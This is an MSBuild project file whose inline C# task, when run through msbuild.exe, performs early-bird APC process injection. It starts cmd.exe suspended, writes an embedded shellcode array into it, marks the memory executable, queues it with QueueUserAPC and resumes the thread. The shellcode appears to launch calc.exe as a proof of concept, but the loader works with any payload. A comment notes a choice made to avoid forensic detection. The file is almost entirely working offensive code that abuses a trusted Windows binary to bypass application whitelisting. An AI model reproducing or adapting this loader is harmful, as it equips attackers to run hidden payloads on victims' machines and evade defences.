<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- x86 -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe queueUserInject.csproj -->
  
  <Target Name="Hello">
   <ClassExample />
  </Target>
	<UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	<Task>
	<Using Namespace="System" />
	<Using Namespace="System.Reflection" />
	<Using Namespace="System.Diagnostics" />
	<Using Namespace="System.Runtime.InteropServices" />
      <Code Type="Class" Language="cs">
      
  
        <![CDATA[
			
			using System;
			using System.Reflection;
			using Microsoft.CSharp;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;
			using System.Diagnostics;
			using System.Runtime.InteropServices;
			
			public class ClassExample :  Task, ITask
			{
				public override bool Execute()
				{
		
						Program.Main();
						
						return true;
				}
			}

			
			public class Program
			{
				public static void Main()
				{
					
					
					

					byte[] shellcode =  new byte[195] {
					0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
					0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
					0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
					0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
					0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
					0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
					0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
					0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
					0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
					0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
					0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
					0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
					0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x20,0x63,0x00 };

					
					string processpath = @"C:\Windows\Syswow64\cmd.exe";
					STARTUPINFO si = new STARTUPINFO();
					PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
					bool success = CreateProcess(processpath, null, 
						IntPtr.Zero, IntPtr.Zero, false, 
						ProcessCreationFlags.CREATE_SUSPENDED, 
						IntPtr.Zero, null, ref si, out pi);
					
					
					IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_READWRITE);
					IntPtr bytesWritten = IntPtr.Zero;
					bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,shellcode,shellcode.Length, out bytesWritten);
					
					IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
					uint oldProtect = 0;
					resultBool = VirtualProtectEx(pi.hProcess,resultPtr, shellcode.Length,PAGE_EXECUTE_READ, out oldProtect);
					IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);
					
					IntPtr ThreadHandle = pi.hThread;
					ResumeThread(ThreadHandle);
					
					
				}
				
				
				private static UInt32 MEM_COMMIT = 0x1000;
			 
				private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; //I'm not using this #DFIR  ;-)
				private static UInt32 PAGE_READWRITE = 0x04;
				private static UInt32 PAGE_EXECUTE_READ = 0x20;
				
				
				[Flags]
				public enum ProcessAccessFlags : uint
				{
					All = 0x001F0FFF,
					Terminate = 0x00000001,
					CreateThread = 0x00000002,
					VirtualMemoryOperation = 0x00000008,
					VirtualMemoryRead = 0x00000010,
					VirtualMemoryWrite = 0x00000020,
					DuplicateHandle = 0x00000040,
					CreateProcess = 0x000000080,
					SetQuota = 0x00000100,
					SetInformation = 0x00000200,
					QueryInformation = 0x00000400,
					QueryLimitedInformation = 0x00001000,
					Synchronize = 0x00100000
				}
				
				[Flags]
				public enum ProcessCreationFlags : uint
				{
					ZERO_FLAG = 0x00000000,
					CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
					CREATE_DEFAULT_ERROR_MODE = 0x04000000,
					CREATE_NEW_CONSOLE = 0x00000010,
					CREATE_NEW_PROCESS_GROUP = 0x00000200,
					CREATE_NO_WINDOW = 0x08000000,
					CREATE_PROTECTED_PROCESS = 0x00040000,
					CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
					CREATE_SEPARATE_WOW_VDM = 0x00001000,
					CREATE_SHARED_WOW_VDM = 0x00001000,
					CREATE_SUSPENDED = 0x00000004,
					CREATE_UNICODE_ENVIRONMENT = 0x00000400,
					DEBUG_ONLY_THIS_PROCESS = 0x00000002,
					DEBUG_PROCESS = 0x00000001,
					DETACHED_PROCESS = 0x00000008,
					EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
					INHERIT_PARENT_AFFINITY = 0x00010000
				}

				public struct PROCESS_INFORMATION
				{
					public IntPtr hProcess;
					public IntPtr hThread;
					public uint dwProcessId;
					public uint dwThreadId;
				}

				public struct STARTUPINFO
				{
					public uint cb;
					public string lpReserved;
					public string lpDesktop;
					public string lpTitle;
					public uint dwX;
					public uint dwY;
					public uint dwXSize;
					public uint dwYSize;
					public uint dwXCountChars;
					public uint dwYCountChars;
					public uint dwFillAttribute;
					public uint dwFlags;
					public short wShowWindow;
					public short cbReserved2;
					public IntPtr lpReserved2;
					public IntPtr hStdInput;
					public IntPtr hStdOutput;
					public IntPtr hStdError;
				}
				
				[Flags]
				public enum    ThreadAccess : int
				{
					TERMINATE           = (0x0001)  ,
					SUSPEND_RESUME      = (0x0002)  ,
					GET_CONTEXT         = (0x0008)  ,
					SET_CONTEXT         = (0x0010)  ,
					SET_INFORMATION     = (0x0020)  ,
					QUERY_INFORMATION       = (0x0040)  ,
					SET_THREAD_TOKEN    = (0x0080)  ,
					IMPERSONATE         = (0x0100)  ,
					DIRECT_IMPERSONATION    = (0x0200)
				}
				
				[DllImport("kernel32.dll", SetLastError = true)]
				public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
					int dwThreadId);

				
				[DllImport("kernel32.dll",SetLastError = true)]
				public static extern bool WriteProcessMemory(
					IntPtr hProcess,
					IntPtr lpBaseAddress,
					byte[] lpBuffer,
					int nSize,
					out IntPtr lpNumberOfBytesWritten);
				
				[DllImport("kernel32.dll")]
				public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
				
				[DllImport("kernel32")]
				public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
					 Int32 size, UInt32 flAllocationType, UInt32 flProtect);

				[DllImport("kernel32.dll", SetLastError = true )]
				public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
				Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
				
				[DllImport("kernel32.dll", SetLastError = true)]
				public static extern IntPtr OpenProcess(
				 ProcessAccessFlags processAccess,
				 bool bInheritHandle,
				 int processId
				);
				
				
				
				 [DllImport("kernel32.dll")]
				public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
										 bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
										string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

				[DllImport("kernel32.dll")]
				public static extern uint ResumeThread(IntPtr hThread);

				[DllImport("kernel32.dll")]
				public static extern uint SuspendThread(IntPtr hThread);
				
				[DllImport("kernel32.dll")]
				public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
				int dwSize, uint flNewProtect, out uint lpflOldProtect);

			}



        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
